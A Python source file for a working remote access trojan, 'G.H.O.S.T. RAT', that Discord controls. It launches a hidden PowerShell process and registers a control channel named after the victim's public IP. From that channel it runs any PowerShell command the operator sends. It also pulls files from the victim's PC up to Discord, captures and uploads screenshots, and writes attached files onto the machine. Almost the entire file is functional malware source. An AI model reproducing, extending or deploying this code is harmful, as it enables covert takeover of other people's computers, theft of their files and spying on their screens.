import discord
from discord.ext import commands
import subprocess
import requests
import os
import pyautogui
from io import BytesIO
import asyncio
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

# commented cause it generates an error when .exe is run without .env file, but you can uncomment for debugging in IDE
# if not TOKEN:
#     print("Error: DISCORD_TOKEN not found in .env file")
    


DOWNLOAD_FOLDER = "C:/DiscordDownloads"

if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

target_channel = None
ps_process = None


async def execute_cmd(command):
    """Execute PowerShell command with timeout to prevent hanging"""
    global ps_process
    if ps_process is None or ps_process.poll() is not None:
        return "Error: PowerShell is not active"

    marker = "__CMD_DONE__"
    wrapper = f"""
try {{
    {command}
}} catch {{
    Write-Output "$($_.Exception.Message)"
}}
Write-Output "{marker}"
"""

    ps_process.stdin.write(wrapper + "\n")
    ps_process.stdin.flush()

    print(f"Executing command: {command}")

    output = []
    timeout_seconds = 15  # puoi aumentare se necessario (es. 30, 60)

    try:
        async with asyncio.timeout(timeout_seconds):
            while True:
                # Esegui readline in un executor per non bloccare l'event loop
                line = await asyncio.get_running_loop().run_in_executor(
                    None, ps_process.stdout.readline
                )
                line = line.rstrip()

                if marker in line:
                    break
                if line:
                    output.append(line)

        return "\n".join(output) or "(no output)"

    except asyncio.TimeoutError:
        return f"[TIMEOUT after {timeout_seconds} seconds] The command may still be running or produced no output."

    except Exception as e:
        return f"Error during execution: {str(e)}"


@bot.event
async def on_ready():
    global target_channel, ps_process
    print(f'Bot logged in as {bot.user}')

    # Start persistent PowerShell process (hidden)
    ps_process = subprocess.Popen(
        ['powershell', '-NoLogo', '-NoExit', '-Command', '-'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
    )

    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text.replace('.', '-')
    except:
        ip = "no-ip"

    if not bot.guilds:
        print("Error: Bot is not in any server!")
        return

    guild = bot.guilds[0]
    target_channel = await guild.create_text_channel(name=f"control-{ip}")
    print(f"Control channel: {target_channel.name} (ID: {target_channel.id})")

    await target_channel.send(
        "```ansi\n[1;32mG.H.O.S.T. RAT is now ONLINE and ready[0m\n"
        f"Control channel: {target_channel.mention}\n\n"
        "Available commands:\n"
        "• Type any PowerShell command directly here (no prefix needed)\n"
        "• !commands → Show full list of bot commands\n"
        "• !load → Download attachments from a message\n"
        "• !download <path> → Upload file from PC to Discord\n"
        "• !screenshot → Take and upload a screenshot of the screen\n\n"
        "All commands work in any channel except PowerShell commands (only here).\n"
        "```"
    )


@bot.command(name='commands')
async def show_commands(ctx):
    """Shows all available commands"""
    commands_list = [
        "`!commands` → Shows this list",
        "`!load` → Downloads attachments from this message to PC",
        "`!download <path>` → Uploads a file from PC to Discord",
        "`!screenshot` → Takes and uploads a screenshot",
        "",
        "Examples for !download:",
        "• !download C:/Users/You/Desktop/report.pdf",
        "• !download \"C:/Documents/file with spaces.zip\"",
        "",
        "In control channel (`control-xxx`): run PowerShell commands directly"
    ]
    
    description = "\n".join(commands_list)
    embed = discord.Embed(
        title="Available Commands",
        description=description,
        color=0x7289DA
    )
    await ctx.send(embed=embed)


@bot.command(name='load')
async def load_attachments(ctx, folder: str = DOWNLOAD_FOLDER):
    """Downloads all attachments from the message to the specified folder"""
    if not ctx.message.attachments:
        await ctx.send("No attachments found in this message!")
        return

    if not os.path.exists(folder):
        try:
            os.makedirs(folder, exist_ok=True)
        except Exception as e:
            await ctx.send(f"Failed to create folder `{folder}`: {e}")
            return

    downloaded = []
    for attachment in ctx.message.attachments:
        file_path = os.path.join(folder, attachment.filename)
        try:
            await attachment.save(file_path)
            downloaded.append(attachment.filename)
        except Exception as e:
            await ctx.send(f"Error saving `{attachment.filename}`: {e}")
            return

    await ctx.send(f"Files successfully downloaded to `{folder}`:\n" + "\n".join(downloaded))


@bot.command(name='screenshot')
async def take_screenshot(ctx):
    """Takes a screenshot of the PC and uploads it to Discord"""
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)

        discord_file = discord.File(
            fp=img_byte_arr,
            filename="screenshot.png"
        )

        await ctx.send(
            content="**Screenshot taken and uploaded**",
            file=discord_file
        )
    except Exception as e:
        await ctx.send(f"Error taking/uploading screenshot: {e}")


@bot.command(name='download')
async def upload_file(ctx, *, file_path: str):
    """Uploads a file from your PC to this Discord channel"""
    file_path = file_path.strip('"').strip("'")

    if not os.path.exists(file_path):
        await ctx.send(f"File not found: `{file_path}`\nMake sure the path is correct.")
        return

    if os.path.isdir(file_path):
        await ctx.send("You provided a folder path. Please specify a **file** path.")
        return

    try:
        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb > 25:
            await ctx.send(f"File too large ({file_size_mb:.1f} MB). Discord limit: 25 MB.")
            return

        with open(file_path, 'rb') as f:
            discord_file = discord.File(f, filename=os.path.basename(file_path))
            await ctx.send(
                content=f"**File uploaded:** {os.path.basename(file_path)}",
                file=discord_file
            )
    except PermissionError:
        await ctx.send("Permission denied: cannot read the file.")
    except Exception as e:
        await ctx.send(f"Error uploading file: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    global target_channel

    if target_channel and message.channel.id == target_channel.id:
        if message.content.startswith(bot.command_prefix):
            await bot.process_commands(message)
            return

        # Ora await perché execute_cmd è async
        result = await execute_cmd(message.content)

        while result:
            chunk = result[:1990]
            await message.channel.send(f"```\n{chunk}\n```")
            result = result[1990:]
        return

    await bot.process_commands(message)

if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    except Exception as e:
        print(f"Fatal error: {e}")
        input("Press Enter to exit...")